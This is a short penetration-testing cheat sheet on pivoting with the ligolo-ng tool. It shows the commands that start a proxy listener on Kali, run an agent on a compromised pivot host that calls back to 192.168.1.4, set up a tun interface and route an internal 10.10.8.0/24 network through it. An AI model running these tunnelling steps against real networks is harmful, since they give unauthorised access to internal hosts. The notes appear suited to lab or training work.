## Pivoting 

# Start the "listener" on Kali 1st
```
./proxy -selfcert
```



# Put an "agent" on 1st Pivot point 

```
./agent -connect 192.168.1.4:11601 -ignore-cert
```


# Turn that connection into a "tunnel" 


```
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
```

# then in the proxy console, pick the 1st pivot point session and type:

```
start
```

# Now tell Kali "to reach the 10.10.8.0/24 network, go through this tunnel":


```
sudo ip route add 10.10.8.0/24 dev ligolo

```
